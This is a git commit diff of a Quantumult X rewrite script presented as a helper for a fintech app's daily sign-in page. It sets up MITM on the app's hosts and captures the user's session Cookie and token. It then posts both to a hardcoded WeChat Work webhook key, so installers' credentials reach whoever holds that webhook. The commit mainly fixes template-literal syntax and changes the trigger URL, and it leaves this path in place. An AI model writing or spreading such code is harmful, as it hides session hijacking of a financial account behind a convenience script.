52f2f3b715353cdb0c3f367b45204da4ce78433e
fengyunjay2004 <34676898+fengyunjay2004@users.noreply.github.com>
2024-11-06 14:33:13 +0800

    Update fzyyj-sign.js

--- fzyyj-sign.js
+++ fzyyj-sign.js
@@ -1,21 +1,26 @@
 /*
 签到页面，点分享海报即可
 ===================
-【 QX  脚本配置 】 :
 [MITM]
-hostname = fzyyj-signin.szcy-fintech.com
-[rewrite_local]
-^https:\/\/fzyyj-signin\.szcy-fintech\.com\/assets\/cancel-e9003a53\.png url script-request-header https://raw.githubusercontent.com/fengyunjay2004/Lexus/refs/heads/main/fzyyj-sign.js
+hostname = fzyyj-signin.szcy-fintech.com,prod.fzyyj.fintechboc.cn
+
+
 ===================
+【 QX  脚本配置 】 :
+===================
+[rewrite_local]
+^https:\/\/fzyyj-signin\.szcy-fintech\.com\/assets\/save-167ad561\.png$ url script-request-header https://raw.githubusercontent.com/fengyunjay2004/Lexus/refs/heads/main/fzyyj-sign.js
+
 */
+
 if ($request) {
     let url = $request.url;
-    if (url.indexOf("https://fzyyj-signin.szcy-fintech.com/assets/cancel-e9003a53.png") !== -1) {
+    if (url.indexOf("https://fzyyj-signin.szcy-fintech.com/assets/save-167ad561.png") !== -1) {
         
         let cookie = $request.headers['Cookie'];
         if (cookie) {
             $prefs.setValueForKey(cookie, "cookieKey");  // 保存 Cookie 到本地存储
-            console.log(cookie值:\n${cookie});
+            console.log(`cookie值:\n${cookie}`);
             let tokenMatch = cookie.match(/token=([^;]+)/);
             if (tokenMatch) {
                 // 提取到的 token 值
@@ -23,25 +28,25 @@ if ($request) {
                 
                 // 保存 token 到本地存储
                 $prefs.setValueForKey(authorization, "AuthorizationKey");  
-                let message1 = ${cookie};
-                let message2 = ${authorization};
+                let message1 = `${cookie}`;
+                let message2 = `${authorization}`;
                 // 发送通知，显示提取的 authorization
-                $notify("云游记成功获取CK和Authorization", "", 以下是获取到的Cookie值\n${cookie}\n\n以下是获取到的Authorization值\n${authorization});
-                console.log(云游记\n以下是获取到的Cookie值\n${cookie}\n\n以下是获取到的Authorization值\n${authorization});
+                $notify("福仔云游记成功获取CK和Authorization", "", `以下是获取到的Cookie值\n${cookie}\n\n以下是获取到的Authorization值\n${authorization}`);
+                console.log(`福仔云游记\n以下是获取到的Cookie值\n${cookie}\n\n以下是获取到的Authorization值\n${authorization}`);
 
                 // 发送到企业微信消息
-                let wechatWebhookUrl = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=284b000b-784b-40b4-8a4a-893f4ab3b4b8"; 
+                let wechatWebhookUrl = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=284b000b-784b-40b4-8a4a-893f4ab3b4b8"; // 企业微信机器人 Webhook 地址
                 let wechatMessage1 = {
                     "msgtype": "text",
                     "text": {
-                        "content": ${message1}
+                        "content": `${message1}`
                     }
                 };
                 
                 let wechatMessage2 = {
                     "msgtype": "text",
                     "text": {
-                        "content": ${message2}
+                        "content": `${message2}`
                     }
                 };
                 
@@ -56,7 +61,7 @@ if ($request) {
                 };
                 
                 $task.fetch(options1).then(response => {
-                    console.log(第一条消息发送成功: ${response.body});
+                    console.log(`第一条消息发送成功: ${response.body}`);
                 
                     // 使用 $task.fetch 发送第二条消息
                     let options2 = {
@@ -69,17 +74,17 @@ if ($request) {
                     };
                 
                     return $task.fetch(options2).then(response => {
-                        console.log(第二条消息发送成功: ${response.body});
+                        console.log(`第二条消息发送成功: ${response.body}`);
                         $done(); // 在第二条消息发送成功后调用 $done()
                     });
                 
                 }, reason => {
-                    console.log(第一条消息发送失败: ${reason.error});
+                    console.log(`第一条消息发送失败: ${reason.error}`);
                     $done(); // 在第一条消息发送失败后调用 $done()
                 });
             } 
         }else {
-            $notify(失败, `, 未找到，请检查请求头);  // 未找到 X-XSRF-TOKEN 和 Token 时通知
+            $notify(`失败`, ``, `未找到，请检查请求头`);  // 未找到 X-XSRF-TOKEN 和 Token 时通知
             $done(); // 未找到 token 时调用 $done()
         }
     }else {
